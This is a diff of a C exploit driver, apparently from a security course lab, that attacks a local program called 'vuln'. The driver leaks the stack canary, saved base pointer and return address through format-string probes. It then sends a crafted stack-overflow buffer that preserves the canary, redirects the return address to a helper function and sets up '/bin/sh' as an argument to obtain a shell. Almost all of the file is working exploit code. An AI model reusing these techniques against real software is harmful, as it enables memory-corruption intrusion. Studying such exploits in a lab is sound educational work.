@@ -1,108 +1,92 @@
-#include "driver_base.c"
+#include <sys/wait.h>
+#include "driver_base.h"
+#include "constants.h"
 
 int main(int argc, char* argv[]) {
-   char *nargv[3];
-   nargv[0] = "vuln";
-   nargv[1] = STRINGIFY(GRP);
-   nargv[2] = NULL;
+    char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };
+	
+	// Fork subprocess vuln
+	create_subproc("./vuln", nargv);
+	fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
+		"vuln, go ahead and do that now. Press 'enter' when you are ready\n"
+		"to continue with the exploit\n");
 
-   uint64_t auth_bp =         0x7ffca4e76e10; // rbp value in auth
-   uint64_t g_bp =            0x7ffca4e76e60; // rbp value in g
-   uint64_t auth_cred_loc =   0x7ffca4e76e00; // loc of cred 
-   uint64_t auth_db_loc =     0x7ffca4e76df8; // loc of db (local var of auth)
-   uint64_t auth_cred     =   0x7ffca4e76d10; // value of cred (after alloca)
- 
-   uint64_t auth_bp_cred_loc_dist  = auth_cred_loc - auth_bp;
-   uint64_t auth_bp_cred_dist = auth_cred - auth_bp;
-   uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;
-
-   uint64_t main_bp =       0x7ffca4e77550; // saved rbp value in mainloop
-   uint64_t auth_main_bp_dist = auth_bp - main_bp;
-   uint64_t g_main_bp_dist = g_bp - main_bp;
-
-   uint64_t main_loop_return_addr = 0x5613287a3ea9;
-   uint64_t private_helper2_addr = 0x5613287a3fa6;
-   uint64_t private_helper2_distance = private_helper2_addr - main_loop_return_addr;
-   
-   create_subproc("./vuln", nargv);
-   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
-           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
-           "to continue with the exploit\n");
-   getchar();
-   get_formatted("%*s"); //Needed to clear out the Welcome message
-
-   put_str("e %217$p\n");
-   send();
-   uint64_t stack_canary;
-   get_formatted("%p", &stack_canary);
-   fprintf(stderr, "driver: Extracted stack_canary=%lx\n", stack_canary);
-
-   put_str("e %218$p\n");
-   send();
-   uint64_t cur_main_bp;
-   get_formatted("%p", &cur_main_bp);
-   fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);
-
-   put_str("e %219$p\n");
-   send();
-   uint64_t curr_main_loop_return_addr;
-   get_formatted("%p", &curr_main_loop_return_addr);
-   fprintf(stderr, "driver: Extracted curr_main_loop_return_addr=%lx\n", curr_main_loop_return_addr);
-
-   // Compute the information for the current run using the probed values
-   uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
-   uint64_t cur_g_bp = cur_main_bp + g_main_bp_dist;
-   
-   uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
-   uint64_t curr_auth_cred = cur_auth_bp + auth_bp_cred_dist;
-
-   uint64_t curr_private_helper2_addr = curr_main_loop_return_addr + private_helper2_distance;
-   
-   fprintf(stderr, "driver: Computed cur_auth_bp=%lx, cur_auth_cred_loc=%lx, curr_private_helper2_addr=%lx\n", 
-           cur_auth_bp, cur_auth_cred_loc, curr_private_helper2_addr);
-
-   // Now, send the payload
-   put_str("p 1234567\n");
-   send();
-   get_formatted("%*s");
+	getchar();
+	get_formatted("%*s"); // Needed to clear out the Welcome message
 
 
-   unsigned explsz = auth_db_cred_dist + 8 - 8 + (4*8);
-   void* *expl = (void**)malloc(explsz);
-   memset((void*)expl, '\1', explsz);
-   expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc;
-   expl[explsz/sizeof(void*)-4] = (void*)curr_auth_cred;
-   expl[explsz/sizeof(void*)-3] = (void*)stack_canary;
-   expl[explsz/sizeof(void*)-2] = (void*)cur_g_bp;
-   expl[explsz/sizeof(void*)-1] = (void*)curr_private_helper2_addr;
-   
-   put_str("u ");
-   put_bin((char*)expl, explsz);
-   put_str("\n");
-   send();
-   get_formatted("%*s");
-   put_str("l \n");
-   send();
+	// The probed offset is 217 for the stack canary
+	put_str("e %217$p\n");
+	send();
+	uint64_t canary;
+	get_formatted("%p", &canary);
+	fprintf(stderr, "driver: Extracted canary=%lx\n", canary);
 
-   usleep(100000);
-   get_formatted("%*s");
+	// The probed offset is 218 for the saved rbp value in main loop
+	put_str("e %218$p\n");
+	send();
+	uint64_t cur_main_bp;
+	get_formatted("%p", &cur_main_bp);
+	fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);
 
-   kill(pid, SIGINT);
+	// The probed offset is 219 for the return address for main_loop
+	put_str("e %219$p\n");
+	send();
+	uint64_t cur_main_return_addr;
+	get_formatted("%p", &cur_main_return_addr);
+	fprintf(stderr, "driver: Extracted cur_main_return_addr=%lx\n", cur_main_return_addr);
 
-   int status;
-   wait(&status);
+	// Now, compute the information for the current run using the probed values
+	uint64_t cur_g_bp			= cur_main_bp + g_main_bp_dist;
+	uint64_t cur_auth_bp		= cur_main_bp + auth_main_bp_dist;
+	uint64_t cur_phelper_addr	= cur_main_return_addr + private_helper_distance2;
+	uint64_t cur_cred			= cur_auth_bp - auth_bp_cred_dist;
 
-   if (WIFEXITED(status)) {
-      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
-   } 
-   else if (WIFSIGNALED(status)) {
-      printf("vuln killed by signal %d\n", WTERMSIG(status));
-   } 
-   else if (WIFSTOPPED(status)) {
-      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
-   } 
-   else if (WIFCONTINUED(status)) {
-      printf("vuln continued\n");
-   }
+	fprintf(stderr, "driver: Computed cur_g_bp=%lx\n", cur_g_bp);
+	fprintf(stderr, "driver: Computed cur_auth_bp=%lx\n", cur_auth_bp);
+	fprintf(stderr, "driver: Computed phelper_addr=%lx\n", cur_phelper_addr);
+	fprintf(stderr, "driver: Computed cur_cred=%lx\n", cur_cred);
 
+	// Send the password payload
+	put_str("p 1234567\n");
+	send();
+	get_formatted("%*s");
+
+	// Allocate and prepare a buffer that contains the exploit string.
+	// g_bp_cred_dist - password (including _)
+	unsigned explsz = g_bp_cred_dist - 8;
+	void **expl = (void **)malloc(explsz);
+
+	// Set all bytes of the exploit string to '\0' which is predictable
+	// This also skips the password check
+	memset((void*)expl, '\0', explsz);
+
+	// Now initialize the parts of the exploit buffer that really matter
+	strcpy((char *)expl, "/bin/sh");
+	expl[auth_bp_cred_dist/sizeof(void *)]		= (void *) cur_phelper_addr;	// overwrite the return address saved by g
+	expl[auth_bp_cred_dist/sizeof(void *) - 1]	= (void *) cur_g_bp;			// preserve auth's base pointer
+	expl[auth_bp_cred_dist/sizeof(void *) - 2]	= (void *) canary;				// preserve auth's canary
+
+
+	expl[g_bp_cred_dist/sizeof(void *) - 2] = (void *) 0x1234567000000000;		// overwrite saved register value used for argument passing
+	expl[g_bp_cred_dist/sizeof(void *) - 3] = (void *) 0x123456789abcdef0;		// overwrite saved register value used for argument passing
+	expl[g_bp_cred_dist/sizeof(void *) - 4] = (void *) (cur_cred + sizeof(char *));	// starting address of "/bin/sh" on stack
+
+	// Send the exploit payload
+	put_str("u ");
+	put_bin((char*)expl, explsz);
+	put_str("\n");
+	send();
+	get_formatted("%*s");
+
+	put_str("l \n");
+	send();
+
+	usleep(100000);
+	get_formatted("%*s");
+
+	kill(pid, SIGINT);
+	int status;
+	wait(&status);
+	display_vuln_status(status);
 }
